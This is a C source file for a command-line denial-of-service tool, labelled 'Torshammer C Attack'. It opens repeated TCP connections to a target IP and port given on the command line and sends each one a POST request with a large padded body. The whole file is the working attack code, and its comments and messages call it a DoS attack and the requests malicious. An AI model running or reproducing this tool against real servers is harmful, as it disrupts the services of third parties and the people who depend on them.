#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

// Function to perform a DoS attack
void perform_attack(const char *target_ip, int target_port, int num_requests) {
    int sock;
    struct sockaddr_in server_addr;
    char request[] = "POST / HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: Torshammer C Attack\r\n"
                     "Content-Length: 10000\r\n"
                     "Connection: keep-alive\r\n\r\n";

    char data[10000];
    memset(data, 'X', sizeof(data)); // Fill the body with X characters.

    // Set up target server details
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    for (int i = 0; i < num_requests; i++) {
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            exit(1);
        }

        // Connect to the target
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sock);
            continue;
        }

        // Send the malicious POST request
        char final_request[1024];
        snprintf(final_request, sizeof(final_request), request, target_ip);
        send(sock, final_request, strlen(final_request), 0);
        send(sock, data, sizeof(data), 0);

        printf("Request #%d sent\n", i + 1);

        // Close the connection
        close(sock);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target IP> <target port> <number of requests>\n", argv[0]);
        exit(1);
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_requests = atoi(argv[3]);

    printf("Starting DoS attack on %s:%d with %d requests...\n", target_ip, target_port, num_requests);

    perform_attack(target_ip, target_port, num_requests);

    printf("Attack completed.\n");

    return 0;
}
